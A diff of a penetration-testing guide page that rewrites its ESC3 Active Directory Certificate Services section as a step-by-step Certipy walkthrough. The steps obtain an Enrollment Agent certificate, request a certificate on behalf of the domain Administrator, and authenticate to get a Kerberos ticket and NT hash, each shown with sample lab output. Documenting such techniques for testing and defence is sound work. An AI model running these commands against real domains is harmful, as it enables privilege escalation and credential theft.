@@ -105,15 +105,70 @@ Condition 2 - Another template that permits low-privileged users to use the enro
 4. The certificate template defines an EKU that enables domain authentication.
 5. No restrictions on enrollment agents are implemented at the CA level.
 
-## ESC3 Attack from Linux
+## Exploitation with Certipy
+The exploitation process involves obtaining an Enrollment Agent certificate and then using it to request a certificate for a privileged user, which is then used for authentication.
 
-For this attack, the first step is to obtain this certificate. It can be requested as any other certificate:
+
+**Step 1: Obtain an Enrollment Agent certificate.** The attacker (`attacker@corp.local`) enrolls for a certificate from the misconfigured `EnrollAgent` template (or an ESC2 "Any Purpose" template).
 ```
-certipy req -u '[email protected]' -p 'Password123!' -ca 'lab-LAB-DC-CA' -template 'ESC3'
+certipy req \
+    -u 'attacker@corp.local' -p 'Passw0rd' \
+    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
+    -ca 'CORP-CA' -template 'EnrollAgent'
+
+Certipy v5.0.0 - by Oliver Lyak (ly4k)
+[*] Requesting certificate via RPC
+[*] Request ID is 1
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'attacker@CORP.LOCAL'
+[*] Certificate object SID is 'S-1-5-21-...-1106'
+[*] Saving certificate and private key to 'attacker.pfx'
+[*] Wrote certificate and private key to 'attacker.pfx'
+
 ```
 
-Subsequently, we can request a certificate on behalf of any user from any other template by including the initial certificate as proof. Regarding authentication, it is crucial to request a certificate from a template that allows Client Authentication in its EKUs. We can use the built- in User template. We will add the option `-on-behalf-of <Account Name>` and include the certificate in the request with the option `-pfx <certificate file>` :
+This command requests a certificate for `attacker@corp.local` using the `EnrollAgent` template. The output `.pfx` file (`attacker.pfx` in this case) will contain the Enrollment Agent certificate.
+
+
+**Step 2: Use the Enrollment Agent certificate to request a certificate on behalf of the target user.** The attacker uses their `attacker.pfx` (their agent certificate obtained in Step 1) to request a certificate from the `User` template (or another suitable agent-enrollable target template) on behalf of `CORP\Administrator`.
 ```
-certipy req -u '[email protected]' -p 'Password123!' -ca lab-LAB-DC-CA -template 'User' -on-behalf-of 'lab\administrator' -pfx blwasp.pfx
+certipy req \
+    -u 'attacker@corp.local' -p 'Passw0rd!' \
+    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
+    -ca 'CORP-CA' -template 'User' \
+    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
+
+Certipy v5.0.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 2
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator@CORP.LOCAL'
+[*] Certificate object SID is 'S-1-5-21-...-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+
 ```
-The above command will give us a certificate as the administrator account, which we can use as we did in previous examples.
+- `-template 'User'`: The target template that allows agent enrollment and issues authentication certificates.
+- `-pfx 'attacker.pfx'`: Specifies the attacker's own certificate, which will be used as the enrollment agent certificate to sign the "on-behalf-of" request.
+- `-on-behalf-of 'CORP\Administrator'`: Specifies the target user for whom the new certificate is being requested. This parameter requires the `<DOMAIN_NETBIOS_NAME>\<SAM_ACCOUNT_NAME>` format for the user.
+This creates `administrator.pfx`, a certificate valid for the `Administrator` account, but now possessed by the attacker.
+
+
+**Step 3: Authenticate using the "on-behalf-of" certificate.** The attacker uses the `administrator.pfx` (obtained in Step 2) to authenticate as the Administrator.
+```
+certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
+
+Certipy v5.0.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@CORP.LOCAL'
+[*]     Security Extension SID: 'S-1-5-21-...-500'
+[*] Using principal: 'administrator@corp.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
+```
